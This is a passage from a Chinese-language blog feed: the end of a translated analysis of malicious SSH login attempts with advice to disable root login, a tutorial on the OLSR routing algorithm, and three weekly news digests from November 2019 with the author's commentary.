(0.92%)</li><li>teamspeak (0.89%)</li></ol><h2 id="analysis-countries">Analysis Countries</h2><p>最后我想可视化地呈现以下恶意访问的来源情况。最后选定的可视化工具是<a href="https://plot.ly/" target="_blank" rel="noopener">plotly</a>。</p><p><img src="https://imgs.codewoody.com/uploads/big/77056379db69bf5b325e301c611b2871.png"></p><blockquote><p>这里我们可以看到最容易被攻击的还是root账户。禁止root账户使用ssh登录可以让你免疫绝大多数ssh攻击。禁止的方法参考：<a href="https://www.howtogeek.com/howto/linux/security-tip-disable-root-ssh-login-on-linux/" target="_blank" rel="noopener">Security Tip: Disable Root SSH Login on Linux</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章翻译自&lt;a href=&quot;https://bastian.rieck.me/blog/posts/2019/ssh_incidents/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Analysing nefarious ssh access attempts&lt;/a&gt;，非核心内容有删改。&lt;/p&gt;
&lt;p&gt;维护我自己的服务器让我在过去的若干年里面学会了很多事情。也让我对那些勇敢的同时维护多个服务器的系统管理员抱有更高的敬意。这篇文章将会讲述我在维护自己的服务器的过程中经常发生的一些奇怪的事情。&lt;/p&gt;
    
    </summary>
    
    
      <category term="翻译" scheme="http://www.codewoody.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>OLSR 路由算法原理</title>
    <link href="http://www.codewoody.com/posts/17082/"/>
    <id>http://www.codewoody.com/posts/17082/</id>
    <published>2019-11-26T07:12:10.000Z</published>
    <updated>2020-01-16T05:13:08.642Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lsr">LSR</h2><p>LSR为基于链路状态的路由算法。如何判断链路状态呢？在无线通信的环境下，只需要节点能够收到另一节点的包，就说明链路有效。另一方面，为了建立端到端的路径，路由算法需要发现并检查一跳由多个单跳链接组成的多条链路的可用性，这就需要不断的洪泛广播(flooding)来进行。这种洪泛的方式是非常浪费的。参加下面的例子：</p><figure><img alt src="https://imgs.codewoody.com/uploads/big/37a383e0cf5a9d404d4ddffa149f0f7a.jpg" style="width: 60%"><figcaption>LSR 示意图</figcaption></figure><p>为了在网络中同步节点状态，需要各个节点进行洪泛广播，产生大量其实是存在冗余的通信。在能源受限的移动网络中是非常不经济的。OLSR通过有选择的洪泛转发(MPR: Multi-Point Relay)来解决这个问题。</p><h2 id="olsr">OLSR</h2><p>OLSR 将 LSR 中简单的路由建立与同步过程切分成两部分：将邻居信息发现与维护同路由发现独立开来。</p><h3 id="邻居发现">邻居发现</h3><p>OLSR通过周期性地广播Hello消息来发现邻居，建立邻居表。邻居表表中记录一跳及二跳邻居节点的信息，节点间的连接也会被记录为单向还是双向。</p><p>Hello消息中包含<strong>发送节点的所有邻居即相关的连接状态(单向还是双向)</strong>。当节点收到的Hello消息中，对方已经将自己加入到邻居列表中时，说明二者之间的连接为双向。</p><p>通过Hello广播过程可以让网络中所有的节点都能知晓距离自己两跳及以内的邻居的信息。</p><p>基于邻居信息，节点可以选择出邻居MPR节点集合。一个节点选定的MPR是负责转发此节点的广播消息的节点。通过控制MPR集合的大小可以减少洪泛的开销。MPR选择分为两步：</p><ol type="1"><li>首先选择能够覆盖「孤立二跳邻居节点」的一跳邻居节点。这里孤立二跳邻居节点是指仅通过一个邻居节点同目标节点相连的二跳邻居节点；</li><li>在余下的一跳邻居节点中，按照覆盖二跳邻居节点的数量从高到低依次选择，直到覆盖所有的二跳邻居节点。</li></ol><figure><img src="https://imgs.codewoody.com/uploads/big/718503c86c626add0ab0f177d6dbb25f.png" alt><figcaption>MPR 选择算法</figcaption></figure><p>如上例所示。首先我们找出覆盖「孤立二跳邻居节点」1和5的A和E，将其加入MPR列表。此时1，2，3，5都被覆盖。在剩下的一跳邻居中，覆盖二跳邻居最多的B（3个）被加入MPR，然后是E，然后是G。当G被加入MPR后，所有的二跳邻居节点都被MPR覆盖。此时的MPR即为我们要选择的MPR全集。</p><p>MPR表会通过Hello信息同步给一跳邻居节点。这样每个节点能够建立本地的MPR Selector表，此表表明节点自己应该转发来自哪些节点的广播消息。</p><h3 id="路由发现">路由发现</h3><p>邻居发现过程使用了Hello消息，路由发现则使用另一种格式的消息：Topology Control消息。TC消息的作用是为节点建立起全局的路由信息。只有MPR节点才会转发TC消息<span class="foot-note-span">【需要注明的一点是：到底是MPR节点在收到TC消息以后是原样转发还是与本地的拓扑表合并以后发送本地拓扑表还存疑】</span>。</p><p>TC消息中包含了发送者的MPR Selector<span class="foot-note-span">【注意MPR Selector不是指一个节点的MPR节点集合，而是一个节点作为MPR应该转发来自哪些节点的消息】</span>信息以及一个Sequence Number。</p><p>基于TC消息的交换，各个节点可以维护一个Topology Table（拓扑表），基于拓扑表节点可以计算出路由表（通过Dijkstra算法）。拓扑表的结构如下：</p><table><colgroup><col style="width: 25%"><col style="width: 25%"><col style="width: 25%"><col style="width: 25%"></colgroup><thead><tr class="header"><th>Destination address</th><th>Destination's MPR</th><th>MPR Selector<br>Sequence Number</th><th>Holding Time</th></tr></thead><tbody></tbody></table><blockquote><p><a href="https://www.runoob.com/markdown/md-table.html" target="_blank" rel="noopener">Markdown中表格的语法</a></p></blockquote><p>上述四项分别为：</p><ol type="1"><li>目标地址</li><li>目标地址的MPR节点</li><li>Sequence Number</li><li>该条目的保持时间</li></ol><p>上面提到TC消息中包含的是发送节点的MPR Selector列表。那么当另一节点收到TC消息时，将TC条目中的MPR Selector作为目标地址，则发送节点即为其MPR节点，然后填入TC消息中的Sequence Number，已经预定义的Holding Time。</p><p>我们考虑下面这个例子：</p><p>这个例子中，A，B，C三个节点均将M选择为自己的MPR节点，那么M会建立如下的MPR Selector列表：</p><table><thead><tr class="header"><th>TC Originator</th><th>MPR Selector</th><th>MPR Selector Sequence</th></tr></thead><tbody><tr class="odd"><td>M</td><td>A</td><td>1</td></tr><tr class="even"><td>M</td><td>B</td><td>1</td></tr><tr class="odd"><td>M</td><td>C</td><td>1</td></tr></tbody></table><p>作为MPR，M会将其MPR Selector列表通过TC消息广播出去。当Y收到M发出的TC消息时，将TC消息中包含的MPR Selector信息转化成拓扑表 (Holding Time省略)：</p><table><thead><tr class="header"><th>Destination address</th><th>Destination's MPR</th><th>MPR Selector<br>Sequence Number</th></tr></thead><tbody><tr class="odd"><td>A</td><td>M</td><td>1</td></tr><tr class="even"><td>B</td><td>M</td><td>1</td></tr><tr class="odd"><td>C</td><td>M</td><td>1</td></tr><tr class="even"><td>...</td><td>...</td><td>...</td></tr></tbody></table><blockquote><p>注意对于一个收到TC消息的节点X而言，消息流的顺序是MPR Selector -&gt; MPR -&gt; X，那么反过来如果X需要向这个MPR Selector发送消息，则链条中的MPR节点就是到达目标前的上一跳节点。所以拓扑表中的第二列也会被称为Last-hop Address。故拓扑表中的每一行其实表明了网路中的一条链路。</p></blockquote><p>网络中周期性的通过TC消息保持拓扑表更新，通过拓扑表使用Dijkstra算法即可获得路由表。</p><h2 id="further-reading">Further Reading</h2><ul><li><a href="https://blog.csdn.net/chixi123/article/details/85068740" target="_blank" rel="noopener">OLSR路由协议工作原理</a></li><li><a href="https://www.youtube.com/watch?v=3V19nPxpMp8&amp;t=881s" target="_blank" rel="noopener">Optimized Link State Routing (OLSR) Mobile Adhoc Network Proactive Routing Protocol</a>: 这是一个Youtube的介绍视频，有点印度口音，通过英文字幕倒是可以听懂。讲的还不错。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;OLSR的全称为Optimized Link State Routing。既然是Optimized，那么说明其实还存在一个名为Link State Routing的路由算法。我们先来介绍一下Link State Routing的设计思路，然后着眼于Link State Routing存在的问题，介绍一下OLSR的优化方向。&lt;/p&gt;
    
    </summary>
    
      <category term="科研" scheme="http://www.codewoody.com/categories/%E7%A7%91%E7%A0%94/"/>
    
    
      <category term="教程" scheme="http://www.codewoody.com/tags/%E6%95%99%E7%A8%8B/"/>
    
      <category term="科研" scheme="http://www.codewoody.com/tags/%E7%A7%91%E7%A0%94/"/>
    
      <category term="路由" scheme="http://www.codewoody.com/tags/%E8%B7%AF%E7%94%B1/"/>
    
  </entry>
  
  <entry>
    <title>Weekly-23</title>
    <link href="http://www.codewoody.com/posts/53357/"/>
    <id>http://www.codewoody.com/posts/53357/</id>
    <published>2019-11-26T04:31:30.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新闻">新闻</h2><h3 id="香港区议会选举泛民大胜"><a href="http://www.bbc.com/zhongwen/simp/chinese-news-50541443" target="_blank" rel="noopener">香港区议会选举泛民大胜</a></h3><p>截至今天(25日)中午12时45分，452个选区点票完毕，全部结果出炉。被视为泛民主派的候选人取得超过385席，是香港主权移交以来最多。建制派取得59席，相比上次区选的292席大幅缩水。</p><p>这次区议会创下多个香港选举纪录，包括有约294万名选民参加，投票率达71.2%，是主权移交以来最高。泛民主派也首次在区议会取得超过一半议席。</p><blockquote><p>这个选举结果说明香港人并不那么反感暴力，也不那么反感港独，「一国两制」作为一种制度仍然在有效运行，但是大陆已经对一国两制失去了兴趣。</p></blockquote><h3 id="王立强间谍案"><a href="http://www.bbc.com/zhongwen/simp/chinese-news-50528735" target="_blank" rel="noopener">「王立强」间谍案</a></h3><p>据多家澳媒报导，一名自称是中国间谍的26岁男子王立强（William, Wang Liqiang，音译）冒着生命危险逃往澳洲，揭露了北京军事情报机构如何通过操纵媒体、渗透大学，干预香港抗议运动和台湾选举，并在澳洲展开业务。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/zdR-I35Ladk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>中国公安部门说，在澳大利亚自称是“叛逃”间谍的王立强，其实是个“在逃”诈骗犯。</p><p><img src="https://imgs.codewoody.com/uploads/big/13ffaae2ff5af350b03098d1c672bf1c.jpg"></p><p>24日，两名大陆商人向心、龚青在台北机场被台湾调查局国家安全处阻止离境；周一（25日）被移送台北地检署进行复讯；周二（26日）被限制出境出海。台湾媒体报道称，向心夫妇在侦讯时有问必答，态度配合，但否认是中国间谍。他们虽被禁止离境，但仍然可以在台湾自由行动。<a href="https://www.bbc.com/zhongwen/simp/chinese-news-50559956" target="_blank" rel="noopener">source</a></p><h3 id="网易暴力裁员事件"><a href="https://www.williamlong.info/archives/5898.html" target="_blank" rel="noopener">网易暴力裁员事件</a></h3><p>近日，一篇名为《网易裁员，让保安把身患绝症的我赶出公司，我在网易亲身经历的噩梦》的文章被广泛转发。作者在文章中称，自己是网易游戏的员工，身患扩张型心肌病。在职期间遇到了一系列不公正待遇，包括认为绩效与个人实际工作情况不符，在其生病后，网易采用各种方式希望其离职，避免进行N+1的离职赔偿，其间遇到了“逼迫、算计、监视、陷害、威胁，甚至被保安赶出公司”。</p><p>随后网易针对该事件发表回应称，确实存在简单粗暴、不近人情等诸多行为，向相关前同事及家人道歉。</p><p>网易在声明中表示，这位前同事的主管因绩效原因向其提出解除劳动合同，文章展示的“业绩排名”，实际为工作量排名，不完全反映工作质量。经复核，其绩效确不合格。此时，该主管并没有充分尽责地了解其患病情况。</p><p>关于解决方案，网易称，这位前同事谢绝了公司在9月主动提出“N+1"外的特殊关怀方案：在“N+1”补偿的基础上，我们将在其离职后的12个月内，继续额外每月无条件提供等同于其月基本工资的关怀金。</p><p><img src="https://imgs.codewoody.com/uploads/big/81f6d5f478d8464bee4c65e212cd0db9.jpg"></p><p>11月29日，网易裁员事件落幕：当事员工谅解，网易公布五项举措。</p><ul><li><a href="https://zhuanlan.zhihu.com/p/93349725" target="_blank" rel="noopener">网易裁员，让保安把身患绝症的我赶出公司。我在网易亲身经历的噩梦！</a></li><li><a href="https://www.zhihu.com/question/357459810" target="_blank" rel="noopener">如何看待网传网易裁员，让保安把身患绝症的 5 年老员工赶出公司一事？</a></li><li><a href="https://www.zhihu.com/question/357634573" target="_blank" rel="noopener">11 月 25 日网易就暴力裁员事件发布道歉信，都有哪些信息量？事件要反转了吗？</a></li><li><a href="https://www.ifanr.com/1286631?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=" target="_blank" rel="noopener">11月29日，网易裁员事件落幕：当事员工谅解，网易公布五项举措</a></li></ul><h3 id="猪肉价格下降"><a href="http://www.bjnews.com.cn/finance/2019/11/28/655579.html" target="_blank" rel="noopener">猪肉价格下降</a></h3><p>近期，一路上涨的猪肉价格已得到明显遏制。11月28日，商务部新闻发言人高峰在商务部例行新闻发布会上表示，11月初以来，由于生猪存栏环比回升、冻猪肉上市量增加、猪肉进口增长等因素的影响，国内猪肉价格回落明显。根据商务部监测，上周（11月18-24日），全国36个大中城市猪肉平均批发价格为每公斤43.66元，比前一周下降了8.6%，降幅比前一周扩大1.7个百分点，比11月初下降了16.5%。</p><h3 id="伦敦发生恐怖袭击"><a href="https://www.bbc.com/zhongwen/simp/uk-50606915" target="_blank" rel="noopener">伦敦发生恐怖袭击</a></h3><p>当地时间周五（29日）下午约14点，市中心伦敦桥上发生持刀捅人事件，造成2人死亡，3人受伤，凶嫌被警方击毙。警方称这是一起恐怖袭击事件。</p><p>伦敦反恐警察负责人尼尔·巴苏告诉记者，周五下午，袭击者已经在作案现场被警察击毙。</p><p>巴苏说，这名男子身着背心，看上去像是一个假的爆炸装置。对于犯罪动机，巴苏表示，暂不予猜测。</p><p>该起袭击事件后不久同一天荷兰也发生了持刀伤人事件。</p><h3 id="其他新闻">其他新闻</h3><h4 id="国内">国内</h4><ul><li>京东网银在线因违规将境内外汇转移境外被罚款2943万元。<a href="https://www.zhihu.com/question/357914185" target="_blank" rel="noopener">source</a></li><li>11月27日艺人高以翔在录制制浙江卫视综艺节目《追我吧》节目过程中晕倒，抢救无效去世。高以翔原名曹志翔，1984 年 9 月 22 日出生于台北，从小在加拿大温哥华长大，曾出演《遇见王沥川》《101次求婚》《胜女的代价》《彩虹的重力》等。<a href="https://www.zhihu.com/pin/1182999661471768576" target="_blank" rel="noopener">source</a></li><li>11月27日，携号转网正式实施。用户号码保持不变，符合条件可自由选择移动、联通、电信等运营商。电信业务经营者不得干涉用户自主选择。<a href="https://www.zhihu.com/question/357997206" target="_blank" rel="noopener">source</a></li><li>28日，香港警方正式进入香港理工大学清查。警方针对香港理工大学内示威者的包围已经持续了12天。<a href="https://www.dw.com/zh/香港警察进入理工大学清查/a-51448127?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>10月31日，经深圳市人民检察院批准，台湾居民李孟居因涉嫌为境外刺探、非法提供国家秘密罪，被深圳市国家安全局依法逮捕；11月26日，经广州市人民检察院批准，伯利兹籍人员李亨利（外文名：LEE HENLEY HU XIANG）因涉嫌资助危害国家安全犯罪活动罪，被广州市国家安全局依法逮捕。二者都与「反中乱港」活动有关。<a href="https://cn.reuters.com/article/china-national-security-tw-hk-1130-idCNKBS1Y4093?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li></ul><h4 id="国际">国际</h4><ul><li>德国东部一家博物馆遭窃，10亿欧元珠宝不翼而飞。<a href="https://cn.reuters.com/article/german-museum-jewels-stolen-1125-mon-idCNKBS1Y006V?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>一名擅闯特朗普海湖庄园的中国女子被判处八个月监禁。<a href="https://cn.reuters.com/article/usa-trump-maralago-chinese-1125-mon-idCNKBS1Y002Y?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>土耳其向中国移交两件中国流失文物。分别是唐代石窟寺壁画和北朝晚期至隋唐的随葬陶俑，距今已有1000多年历史。</li><li>特朗普签署《香港人权与民主法案》。<a href="http://www.bbc.com/zhongwen/simp/world-50582258" target="_blank" rel="noopener">source</a>。28日，中国外交部召见美国驻华大使，就美“香港人权与民主法案”签署成法提出严正交涉和强烈抗议。<a href="https://cn.reuters.com/article/china-summons-usa-ambassador-128-thur-idCNKBS1Y20D6?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>29日，日本前首相中曾根康弘去世，享年101岁。</li><li>荷兰购物街发生持刀袭击事件，多人受伤。<a href="https://world.huanqiu.com/article/9CaKrnKo4ME" target="_blank" rel="noopener">source</a></li><li>韩国流行乐歌手郑俊英和崔钟训分别被判6年和5年监禁，他们被控对醉酒女性实施轮奸。<a href="http://www.bbc.com/zhongwen/simp/world-50601235" target="_blank" rel="noopener">source</a></li></ul><h4 id="科技">科技</h4><ul><li>华为发布全新平板电脑MatePad Pro。<a href="https://www.ifanr.com/1285146?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=" target="_blank" rel="noopener">source</a></li></ul><p><img src="https://imgs.codewoody.com/uploads/big/00e97702559ae48de3d8f469a742c995.jpeg"></p><ul><li>11月26日，阿里巴巴在港交所正式挂牌，股票代码[9988.HK]，挂牌首日开盘价187港元/股，较发行价每股176港元高开6.25%，总市值4.04万亿。<a href="http://www.lieyunwang.com/archives/461082" target="_blank" rel="noopener">source</a></li><li>米其林发布2020北京米其林指南，这也是首版北京米其林指南。此次榜单包含23家餐厅，其中有1家三星餐厅（新荣记），2家二星餐厅（京兆尹、屋里厢），和20家一星餐厅。<a href="http://www.huxiu.com/article/328557.html?f=wangzhan" target="_blank" rel="noopener">source</a></li><li>央行副行长范一飞周四表示，将挑选数字货币试点地区。<a href="http://finance.eastmoney.com/a/201911281306636762.html" target="_blank" rel="noopener">source</a></li><li>俄罗斯西伯利亚冻土层发现一只1.8万年前的狼狗幼崽，保存完好，可能成为世界上发现的最古老的狗的样本。<a href="http://www.bbc.com/zhongwen/simp/world-50592711" target="_blank" rel="noopener">source</a></li></ul><h2 id="文章言论与资源">文章、言论与资源</h2><ul><li>如何自制一辆电动摩托车</li></ul><iframe width="560" height="315" src="https://www.youtube.com/embed/UD3KymY86z8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><ul><li>特斯拉汽车的自动驾驶可以挽救数百万人的生命，但它可能首先会造成一些人的死亡，然后才能达到这个目标。 -- <a href="https://www.bloomberg.com/news/features/2019-10-09/tesla-s-autopilot-could-save-the-lives-of-millions-but-it-will-kill-some-people-first?srnd=businessweek-v2" target="_blank" rel="noopener">彭博社</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;截至今天(25日)中午12时45分，452个选区点票完毕，全部结果出炉。被视为泛民主派的候选人取得超过385席，是香港主权移交以来最多。建制派取得59席，相比上次区选的292席大幅缩水。&lt;/p&gt;
&lt;p&gt;这次区议会创下多个香港选举纪录，包括有约294万名选民参加，投票率达71.2%，是主权移交以来最高。泛民主派也首次在区议会取得超过一半议席。&lt;/p&gt;
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
  <entry>
    <title>Weekly-22</title>
    <link href="http://www.codewoody.com/posts/4268/"/>
    <id>http://www.codewoody.com/posts/4268/</id>
    <published>2019-11-21T12:25:09.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<p>受了点伤，这周更新的内容估计要少一点了。</p><h2 id="新闻">新闻</h2><h3 id="至21日伊朗连续第三天关闭互联网"><a href="https://www.voachinese.com/a/iran-blocks-internet-for-3rd-day-20191118/5171338.html" target="_blank" rel="noopener">至21日伊朗连续第三天关闭互联网</a></h3><p>伊朗当局为镇压全国反政府抗议活动，已连续第三天关闭互联网服务。自上星期五（11月15日）抗议爆发以来，已有至少八人丧生。</p><figure><img src="https://imgs.codewoody.com/uploads/big/803c4704ec6cbdffb0e9e8a32573c2ed.jpg" alt><figcaption>伊朗反政府抗议者封锁了首都德黑兰的一条道路。(2019年11月17日)</figcaption></figure><p>互联网中断使得伊朗人很难与其他国家和外界分享抗议图片和信息。星期五早些时候，政府突然将汽油价格上调了50%，引发了抗议活动。伊朗新的汽油价格约合每升合13美分，仍属世界最低油价之列。但许多伊朗人认为，在经济状况不断恶化之际，这将给他们增加更多经济负担。</p><h3 id="美国两院通过香港人权法案"><a href="https://www.voachinese.com/a/HOUSE-PASSED-HONG-KONG-ACT-20191120/5174540.html" target="_blank" rel="noopener">美国两院通过香港人权法案</a></h3><p>美国国会众议院星期三(11月20日)以压倒多数通过了《香港人权与民主法案》。这项法案将定期审议香港的自治地位，从而决定是否维持美国法律所赋予香港的特殊待遇。这部法案接下来送交特朗普总统等候签署。</p><p>参议院在星期二无异议通过了这部法案。众议院在今年9月曾无异议通过同一法案的众议院版本。按照国会程序，两院版本如果不同，在送交总统签署前，必须加以协调。然而，在国会年底休假将近之际，众议院直接对参议院版本进行了表决，因此无须再整合版本和二度表决。</p><blockquote><p>有意思的是，NYT的报道说这一事件的反复显示了华为在白宫的脆弱地位。其实恰恰想法。要是华为的地位真的脆弱，早就完全禁了，何至于这么反复延期，落人笑柄呢？</p></blockquote><h3 id="美国延期华为的临时许可"><a href="https://cn.nytimes.com/technology/20191119/huawei-us-china/" target="_blank" rel="noopener">美国延期华为的临时许可</a></h3><p>本周伊始，特朗普政府给了中国电信巨头华为一个喘息的机会。它很可能会以不同的监管机构投票表决，使这家企业在美国更难开展业务而告终。商务部周一表示，将把允许企业向华为出口商品的许可证延长90天，尽管华为被列入美国政府的黑名单，禁止与美国合作伙伴开展业务。联邦通信委员会（Federal Communications Commission，简称FCC）将于周五投票，决定是否禁止无线供应商利用联邦补贴购买华为设备——设立该补贴的目的是将宽带接入扩大到服务不足的地区。</p><h3 id="其他">其他</h3><h4 id="国际">国际</h4><ul><li>安倍晋三成为日本在职时间最长的首相。<a href="https://cn.reuters.com/article/japan-abe-longest-serving-1120-wedn-idCNKBS1XU0CV?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>三艘在俄罗斯被扣押的乌克兰舰艇回到乌克兰。<a href="http://sputniknews.cn/opinion/201911211030093179/" target="_blank" rel="noopener">source</a><span class="foot-note-span">【进来欧盟(主要是法国牵头)正在从中协调俄乌和解，这一举措应该是和解进程推进的表现】</span></li><li>中国区块链技术相关专利申请数量位居世界第一，达到美国的三倍。<a href="http://sputniknews.cn/china/201911211030093101/" target="_blank" rel="noopener">source</a></li><li>图瓦卢外交部长科菲访问台湾。</li></ul><h4 id="国内">国内</h4><ul><li>王思聪21日再次被限制消费。<a href="https://www.zhihu.com/question/356958027" target="_blank" rel="noopener">source</a></li><li>江一燕获奖的别墅被确认是违建。<a href="https://www.zhihu.com/question/356958027" target="_blank" rel="noopener">source</a></li></ul><h4 id="科技">科技</h4><ul><li>Nature 重磅发现癌基因存在于环形 ecDNA。<a href="https://www.zhihu.com/question/356918720" target="_blank" rel="noopener">source</a></li><li>阿里王坚当选中国工程院院士。<a href="https://www.williamlong.info/archives/5896.html" target="_blank" rel="noopener">source</a></li><li>IPv4地址耗尽。<a href="https://www.ithome.com/0/459/157.htm" target="_blank" rel="noopener">source</a></li></ul><h2 id="文章与资源">文章与资源</h2><ul><li><a href="http://www.ruanyifeng.com/blog/2019/11/css-position.html" target="_blank" rel="noopener">CSS定位详解</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;受了点伤，这周更新的内容估计要少一点了。&lt;/p&gt;
&lt;h2 id=&quot;新闻&quot;&gt;新闻&lt;/h2&gt;
&lt;h3 id=&quot;至21日伊朗连续第三天关闭互联网&quot;&gt;&lt;a href=&quot;https://www.voachinese.com/a/iran-blocks-internet-for-3rd
      
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
  <entry>
    <title>Weekly-21</title>
    <link href="http://www.codewoody.com/posts/4588/"/>
    <id>http://www.codewoody.com/posts/4588/</id>
    <published>2019-11-12T05:33:41.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[</p><h2 id="新闻">新闻</h2><h3 id="天猫双十一总成交额达2684亿">天猫双十一总成交额达2684亿</h3><p><img src="https://imgs.codewoody.com/uploads/big/36dce87fe23e5e8a2a69a3634adc2332.jpg"></p><p>11月12日零点，2019天猫双十一落下帷幕，双11总成交额超2600亿大关，最终定格2684亿元。 2018年天猫双11最终成交额2135亿元，今年双11开幕16小时31分12秒，天猫成交额就超过了去年全天。</p><p>天猫及淘宝总裁蒋凡今天凌晨在阿里巴巴西溪总部园区向媒体表示，新消费深刻重构了人、货、场，驱动了前所未有的商业数字化变革，发掘了商业新人口，创造了商业新供给，带来了商业新行为。</p><h3 id="白头盔创办人在土耳其死亡"><a href="http://www.bbc.com/zhongwen/simp/world-50388694" target="_blank" rel="noopener">白头盔创办人在土耳其死亡</a></h3><p>在叙利亚内战时期成立的叙利亚公民防御组织创办人之一是一名英国退伍陆军军官，他的尸体在他伊斯坦布尔办公室附近被发现。</p><h3 id="日全港学校停课大陆学生撤离香港">14日全港学校停课，大陆学生撤离香港</h3><p>香港教育局今天(13日)发布消息称，因当前及可预计的状况，及全港学校的整体汇报，全港学校（包括幼稚园、小学、中学及特殊学校）将于明天停课。发言人表示，香港社会连日受到暴力示威者广泛破坏，情况令人齿冷；教育局强烈呼吁示威者立即停止所有暴力行为，尽快让学生安全上学。</p><p>由于示威对抗活动气氛蔓延到校园，众多大陆学生受到针对，因此目前有大量大陆学生选择临时返回深圳。深圳的高校为这些学生提供了临时住宿。</p><h3 id="月新能源汽车销量同比降低45"><a href="http://www.qdaily.com/articles/64740.html?source=feed" target="_blank" rel="noopener">10月新能源汽车销量同比降低45%</a></h3><p>自今年 7 月中央和地方政府减少新能源车补贴以来，国内新能源车（仅指纯电动和插电混动）销量连续四个月同比减少，10 月同比降幅进一步扩大至 45.65%，几近腰斩。</p><h3 id="其他新闻">其他新闻</h3><h4 id="国内新闻">国内新闻</h4><ul><li>北京朝阳区确认接诊两例肺鼠疫病例。患者来自内蒙古自治区。</li><li>国足1-2不敌叙利亚，主教练里皮随后宣布辞职。</li></ul><h4 id="国际新闻">国际新闻</h4><ul><li>中国敬业集团试图收购英国钢铁公司。<a href="http://www.bbc.com/zhongwen/simp/business-50416457" target="_blank" rel="noopener">source</a></li><li>意大利威尼斯遭遇半世纪以来最大水灾。<a href="https://www.dw.com/zh/威尼斯遭半世纪来最大水灾/a-51222750?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>韩国《Produce 101》综艺节目被警方查出投票全系列造假，警方已经确认制作团队介入其中。据悉，因涉嫌操纵得票被拘留的安俊英等两人14日被移交检察机关。 ​<a href="https://www.zhihu.com/question/341361660" target="_blank" rel="noopener">source</a></li><li>特斯拉宣布在德国建立新厂。<a href="http://www.qdaily.com/articles/64750.html?source=feed" target="_blank" rel="noopener">source</a></li><li>波音737 MAX将在下个月重新获得飞行许可。该型号飞机已经停飞了7个月了。</li></ul><h4 id="科技新闻">科技新闻</h4><ul><li>苹果发布16寸屏幕的Macbook Pro</li><li>微软全球执行副总裁沈向洋 Harry Shum 将离职微软。沈向洋为在微软级别最高的中国人。他在1996年加入微软，2007年出任搜索部门研发工程副总裁；2013年成为微软执行副总裁，进入微软核心管理层，负责微软研究院的技术和研究公司。<a href="https://www.zhihu.com/question/355746956" target="_blank" rel="noopener">source</a></li><li>11月13日，阿里巴巴向港交所提交上市申请。<a href="https://www1.hkexnews.hk/app/sehk/2019/100781/documents/sehk19111301429_c.pdf" target="_blank" rel="noopener">source</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://imgs.codewoody.com/uploads/big/36dce87fe23e5e8a2a69a3634adc2332.jpg&quot;&gt;
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
</feed>
